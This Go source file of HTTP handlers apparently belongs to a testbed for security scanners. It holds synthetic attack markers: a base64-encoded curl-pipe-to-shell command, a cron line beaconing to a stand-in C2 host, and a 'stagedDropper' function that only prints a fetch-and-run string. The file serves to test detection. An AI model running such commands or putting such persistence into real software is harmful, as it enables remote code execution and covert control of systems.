package handlers

import (
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/reachable/reach-testbed-github-go/internal/safety"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")

	parsed, err := url.Parse(source)
	if err != nil || parsed.Scheme != "https" {
		http.Error(w, "only https URLs are allowed", http.StatusBadRequest)
		return
	}
	if !safety.AllowedHostname(parsed.Hostname()) {
		http.Error(w, "host not allowed", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(source)
	if err != nil {
		log.Printf("FetchTool: http.Get %s: %v", source, err)
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: os.Create %s: %v", target, err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("FetchTool: io.Copy: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
